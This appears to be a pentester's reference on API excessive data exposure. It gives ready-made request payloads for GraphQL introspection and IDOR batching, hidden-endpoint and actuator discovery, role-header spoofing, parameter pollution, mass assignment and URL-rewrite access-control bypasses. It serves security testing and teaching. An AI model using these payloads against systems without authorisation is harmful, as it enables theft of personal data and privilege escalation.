# API Excessive Data Exposure — Deep Reference

## Table of Contents
1. The Excessive Data Exposure Pattern
2. REST API Hidden Field Extraction
3. GraphQL Enumeration and Field Mining
4. Hidden API Versions and Endpoints
5. Response Filtering Bypass
6. Internal API Exposure
7. Field-Level Access Control Failures
8. API Discovery Techniques
9. Server-Side Parameter Pollution (SSPP)
10. Access Control Bypass via URL/Header Manipulation

---

## 1. The Excessive Data Exposure Pattern

The most common API security failure pattern: the backend fetches a full object from the database and serializes the entire thing into the response. The frontend JavaScript then picks out only the fields it needs to display. The developer assumes the frontend filtering is the security boundary — it isn't.

**Example:**
```json
// What the UI shows:
Name: John Doe
Email: john@company.com

// What the API actually returns:
{
  "id": 12345,
  "name": "John Doe",
  "email": "john@company.com",
  "ssn": "123-45-6789",           ← never displayed
  "date_of_birth": "1985-04-12",  ← never displayed
  "internal_notes": "VIP customer, credit risk HIGH",
  "password_hash": "$2b$12$...",   ← definitely not displayed
  "stripe_customer_id": "cus_xxx", ← billing reference
  "admin_flag": false,             ← authorization field — try changing
  "salary": 95000                  ← if this is an HR app
}
```

**Your job:** Intercept every API response the app makes and compare it to what the UI renders. Every field the UI doesn't display is a potential finding.

---

## 2. REST API Hidden Field Extraction

### Burp Suite Approach
1. Browse the entire application with Burp intercepting
2. In Proxy → HTTP History, filter to show only API calls (JSON responses)
3. For each response, look at the raw JSON — not what the app shows
4. Build a list of all fields returned per endpoint
5. Flag any field that sounds sensitive and isn't displayed

### Sensitive Field Names to Watch For
```
# Authentication / Security:
password, password_hash, hashed_password, bcrypt, salt
secret, api_key, token, session_token, auth_token, reset_token
mfa_secret, totp_secret, backup_codes

# Personal Identifiable Information:
ssn, social_security, tax_id, national_id, passport_number
dob, date_of_birth, birthdate
full_address, home_address, billing_address
phone, mobile, personal_email
ip_address, last_ip, login_ip, device_fingerprint
location, latitude, longitude, geo

# Financial:
card_number, credit_card, full_card, pan
bank_account, routing_number, iban
balance, account_balance, credit_limit
salary, compensation, income

# Internal / Admin:
internal_id, admin_notes, internal_notes, risk_score
is_admin, admin_flag, role, permissions
fraud_score, trust_level
customer_segment, churn_risk
```

### Expanding Response Fields via Request Modification
Some APIs support field expansion — by default they return summary data, but you can request more:
```
GET /api/users/me?fields=*
GET /api/users/me?include=ssn,dob,address
GET /api/users/me?expand=all
GET /api/users/me?verbose=true
GET /api/users/me?full=1
GET /api/users/me?format=full
```

### Older API Versions
If `/api/v2/users/me` strips sensitive fields, try:
```
GET /api/v1/users/me
GET /api/users/me  (unversioned)
GET /api/v0/users/me
GET /api/beta/users/me
GET /api/internal/users/me
```
Older versions often predate the security-conscious stripping of sensitive fields.

---

## 3. GraphQL Enumeration and Field Mining

GraphQL is especially powerful for this attack because you can explicitly request any field defined in the schema — and the schema itself is often publicly enumerable.

### Step 1: Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

If introspection is enabled (common in production — it shouldn't be), you get the full schema including every type and every field. Look for types with sensitive field names.

### Step 2: Request Hidden Fields
Once you know the field exists, request it directly:
```graphql
query {
  me {
    id
    email
    ssn          # try it — was it in the schema?
    dateOfBirth
    phoneNumber
    passwordHash
    internalNotes
    adminFlag
  }
}
```

The server may return the field even if the frontend never requests it.

### Step 3: Other User's Data via GraphQL
```graphql
query {
  user(id: "12345") {  # another user's ID
    email
    ssn
    address
  }
}

# Or batch query multiple users:
query {
  users(ids: ["12345", "12346", "12347"]) {
    email
    ssn
  }
}
```

### Introspection Bypass
If introspection is disabled, try:
```graphql
# Field suggestion attack — GraphQL error messages suggest valid field names
query {
  me {
    ssm  # intentional typo
  }
}
# Error: "Did you mean 'ssn'?"
```

```graphql
# __type query (sometimes allowed even when __schema is blocked):
{
  __type(name: "User") {
    fields {
      name
    }
  }
}
```

### GraphQL Batching Attack
Some implementations allow batching, which can bypass rate limiting on IDOR:
```json
[
  {"query": "{ user(id: \"1\") { email ssn } }"},
  {"query": "{ user(id: \"2\") { email ssn } }"},
  {"query": "{ user(id: \"3\") { email ssn } }"}
]
```

### GraphQL Alias IDOR
Use aliases to query multiple users in one request:
```graphql
query {
  user1: user(id: "1001") { email ssn }
  user2: user(id: "1002") { email ssn }
  user3: user(id: "1003") { email ssn }
}
```

---

## 4. Hidden API Versions and Endpoints

### Version Enumeration
```
/api/v1/
/api/v2/
/api/v3/
/api/v4/
/api/beta/
/api/alpha/
/api/internal/
/api/dev/
/api/test/
/api/staging/
/api/mobile/    ← mobile-specific API often has fewer restrictions
/api/legacy/
/api/old/
```

### Path Variations
```
/api/users/        → try /api/user/ (singular)
/api/accounts/     → try /api/account/
/api/v2/profile/   → try /v2/profile/, /profile/v2/
```

### Content Type Switching
Same endpoint, different content type — sometimes different behavior:
```
Accept: application/json         → normal response
Accept: application/xml          → may return more fields in XML
Accept: text/csv                 → export format, more data
Accept: application/vnd.api+json → JSON:API format, different serialization
```

### Developer/Debug Endpoints
These are often left in production:
```
/api/debug/
/api/healthcheck/
/api/status/
/api/metrics/ (Prometheus metrics leaking internal data)
/api/info/
/actuator/ (Spring Boot — often exposes /actuator/env, /actuator/beans)
/actuator/env
/actuator/configprops
/manage/
/__admin/
/_admin/
/admin/api/
```

---

## 5. Response Filtering Bypass

Some APIs filter the response based on the requester's role. These filters are often bypassable.

### Role Header Injection
```
X-Role: admin
X-User-Role: admin
X-Admin: true
X-Internal: true
X-Forwarded-User: admin
X-Original-User: admin
```

### Parameter-Based Expansion
```
GET /api/users/me?admin=true
GET /api/users/me?role=admin
GET /api/users/me?debug=1
GET /api/users/me?internal=1
GET /api/users/me?include_sensitive=true
```

### Accept-Language / Locale
Some localization features accidentally expose additional fields in certain locale responses.

### Callback / JSONP
```
GET /api/users/me?callback=processData
# Response: processData({"user": {...all fields...}})
# Some JSONP endpoints skip field filtering
```

---

## 6. Internal API Exposure

Internal APIs built for microservice communication are sometimes exposed to the internet.

### Common Internal API Patterns
```
/internal/api/
/private/api/
/service/
/microservice/
/rpc/
/.internal/
/api/system/
```

### mTLS / IP Restriction Bypass
Internal APIs protected by IP whitelisting:
- Try from the server itself via SSRF
- Add `X-Forwarded-For: 127.0.0.1` or `X-Real-IP: 10.0.0.1`
- Try internal IP ranges: `10.x.x.x`, `172.16.x.x`, `192.168.x.x`

### Kubernetes Service Endpoints
If you find SSRF or are testing from inside a cloud environment:
```
http://internal-api.default.svc.cluster.local/admin/users
http://user-service:8080/api/all-users
```

---

## 7. Field-Level Access Control Failures

Even when overall endpoint access is controlled, individual field access often isn't.

### Mass Assignment
Sending extra fields in write requests:
```json
PUT /api/profile
{
  "name": "John",
  "email": "john@example.com",
  "is_admin": true,        ← should be ignored but sometimes isn't
  "role": "admin",
  "verified": true,
  "credit": 99999
}
```

### Partial Response IDOR
If the full object is IDORed and filtered:
```
GET /api/users/1234?fields=email,name
# Returns only email and name — filtered

GET /api/users/1234?fields=email,name,ssn
# Does adding ssn to the fields request return it?
```

### Nested Object Exposure
When requesting an object, related nested objects may not have the same filtering:
```json
GET /api/orders/1234
{
  "order_id": 1234,
  "items": [...],
  "user": {                    ← nested user object
    "email": "victim@x.com",
    "ssn": "123-45-6789",      ← full user object may be included
    "address": {...}
  }
}
```

---

## 8. API Discovery Techniques

Finding API endpoints not linked from the UI.

### JavaScript Source Mining
```bash
# Download all JS files from the target
# Search for API endpoints:
grep -r "api/" app.js | grep -E "(GET|POST|PUT|DELETE|fetch|axios)"
grep -r '"/api/' app.js
grep -r "endpoint" app.js

# Tools:
# LinkFinder: python3 linkfinder.py -i https://target.com -d
# JSParser: finds endpoints in JS files
```

### Wordlist-Based Discovery
```bash
# Use ffuf with API wordlists:
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/FUZZ \
     -mc 200,201,301,302,401,403

# API-specific wordlists:
# SecLists: /Discovery/Web-Content/api/
# assetnote wordlists
```

### OpenAPI / Swagger Discovery
```
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api/swagger.json
/api/openapi
/v1/api-docs
/docs/api
```

If you find a Swagger/OpenAPI file — every endpoint is documented for you. Use it to enumerate all endpoints and identify which ones return sensitive data or are missing auth.

### Mobile App Reverse Engineering
Mobile apps often call backend APIs not accessible from the web frontend:
- Decompile Android APK with jadx
- Decrypt iOS app with frida-ios-dump
- Extract hardcoded endpoints, API keys, and base URLs
- These mobile APIs often have weaker security than the web API

---

## 9. Server-Side Parameter Pollution (SSPP)

When user input is embedded into a server-side API call to an internal service, you can inject additional parameters that affect the internal request.

### Query String Injection
```
# Normal request:
GET /userSearch?name=alice
# Server calls internally: /internalAPI/users?name=alice&role=user

# Attacker injects (URL-encode &):
GET /userSearch?name=alice%26role=admin
# Server calls internally: /internalAPI/users?name=alice&role=admin&role=user
# If the internal API takes the last (or first) value → role becomes admin
```

### Parameter Truncation via Fragment (#)
```
GET /userSearch?name=alice%23foobar
# # is the fragment delimiter — everything after it is ignored server-side
# Server calls: /internalAPI/users?name=alice  (truncated — no &role=user appended)
# Authorization parameters that were supposed to be appended are now stripped
```

### REST Path Traversal in Parameters
```
GET /userSearch?userId=../admin
# Server calls: /internalAPI/users/../admin → /internalAPI/admin
# Path traversal via parameter → accesses admin endpoint
```

### JSON Injection via Form Fields
When a form field value is embedded server-side into a JSON request body:
```
username field value:  attacker","access_level":"administrator
# Server constructs: {"username":"attacker","access_level":"administrator","role":"user"}
# If the parser takes the FIRST occurrence → your injected level wins
```

**How to detect SSPP:**
1. Add duplicate parameters with different values → different responses = server parsing conflict
2. Add `%26param=value` to parameters → if the internal API behavior changes, it's parsed
3. Add `%23` (fragment) → if authorization is stripped, you get unauthorized access

---

## 10. Access Control Bypass via URL/Header Manipulation

### X-Original-URL / X-Rewrite-URL Override
Some frameworks (Symfony, some Spring configs) allow the `X-Original-URL` header to override the actual request path for routing:
```
GET /public/home HTTP/1.1
X-Original-URL: /admin/deleteUser

# The server routes the request to /admin/deleteUser
# while the access control sees /public/home (the actual URL)
```

Also try:
```
X-Rewrite-URL: /admin/deleteUser
X-Override-URL: /admin/deleteUser
```

### URL Case Variation
```
/admin/deleteUser   →  403
/ADMIN/deleteUser   →  200
/Admin/DeleteUser   →  200
/admin/DELETEUSER   →  200
```
Case-insensitive routing with case-sensitive authorization rules = bypass.

### Trailing Slash Variation
```
/admin/deleteUser    →  403
/admin/deleteUser/   →  200
```
The trailing slash often matches a different route handler that doesn't apply the same middleware.

### Path Extension Matching (Spring Boot legacy)
Spring's `useSuffixPatternMatch` means `/admin/users.json` matches the `/admin/users` route:
```
/admin/users        →  403
/admin/users.json   →  200
/admin/users.html   →  200
```

### Referer-Based Access Control
Some multi-step admin workflows check the `Referer` header to ensure requests came from the correct previous page. This is fully attacker-controlled:
```
GET /admin/deleteUser?id=1234 HTTP/1.1
Referer: https://target.com/admin/users

# If the admin panel only checks Referer, this request is approved
# regardless of whether you actually came from that page
```

### Multi-Step Process Skip
If a workflow enforces access at step 2 but not step 3:
```
Step 1: /checkout/cart        (no auth check)
Step 2: /checkout/payment     (validates you own this cart)
Step 3: /checkout/confirm     (trusts step 2 was done — no re-check)

# Skip steps 1-2, submit step 3 directly with someone else's cart ID
POST /checkout/confirm
{"cart_id": "victim_cart_id"}
```

**Hidden privilege parameters:**
```
# Try adding to any request:
?admin=true
?role=admin
?debug=true
?superuser=1

# Or in the request body:
{"isAdmin": true, "role": "superuser", "verified": true, "premium": true}
```
